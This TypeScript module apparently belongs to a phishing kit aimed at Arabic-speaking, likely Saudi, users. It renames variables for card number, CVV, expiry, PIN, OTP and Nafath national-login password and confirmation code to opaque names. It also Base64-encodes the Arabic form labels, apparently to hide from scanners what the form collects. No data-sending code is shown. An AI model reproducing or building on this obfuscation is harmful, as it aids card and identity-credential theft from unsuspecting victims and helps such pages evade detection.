export const varMap = {
  'cardNumber': '_v1',
  'setCardNumber': '_sv1',
  'cvv': '_v2',
  'setCvv': '_sv2',
  'expiryDate': '_v3',
  'setExpiryDate': '_sv3',
  'cardHolderName': '_v4',
  'setCardHolderName': '_sv4',
  'cardType': '_v5',
  'setCardType': '_sv5',
  'otp': '_v6',
  'setOtp': '_sv6',
  'otpValue': '_v7',
  'setOtpValue': '_sv7',
  'pinCode': '_v8',
  'setPinCode': '_sv8',
  'password': '_v9',
  'setPassword': '_sv9',
  'nafadPassword': '_v10',
  'setNafadPassword': '_sv10',
  'nafadConfirmationCode': '_v11',
  'setNafadConfirmationCode': '_sv11',
}

export const textMap: Record<string, string> = {
  'رقم البطاقة': btoa('رقم البطاقة'),
  'رمز CVV': btoa('رمز CVV'),
  'تاريخ الانتهاء': btoa('تاريخ الانتهاء'),
  'اسم حامل البطاقة': btoa('اسم حامل البطاقة'),
  'رمز التحقق من البنك': btoa('رمز التحقق من البنك'),
  'رقم PIN السري': btoa('رقم PIN السري'),
  'كلمة مرور نفاذ': btoa('كلمة مرور نفاذ'),
  'رمز التأكيد': btoa('رمز التأكيد'),
  'أدخل رقم البطاقة': btoa('أدخل رقم البطاقة'),
  'أدخل رمز CVV': btoa('أدخل رمز CVV'),
  'أدخل رمز التحقق': btoa('أدخل رمز التحقق'),
}

export function dt(encoded: string): string {
  try {
    return atob(encoded)
  } catch {
    return encoded
  }
}

export function gv(name: string): string {
  return varMap[name as keyof typeof varMap] || name
}

export function gt(text: string): string {
  return textMap[text] || btoa(text)
}
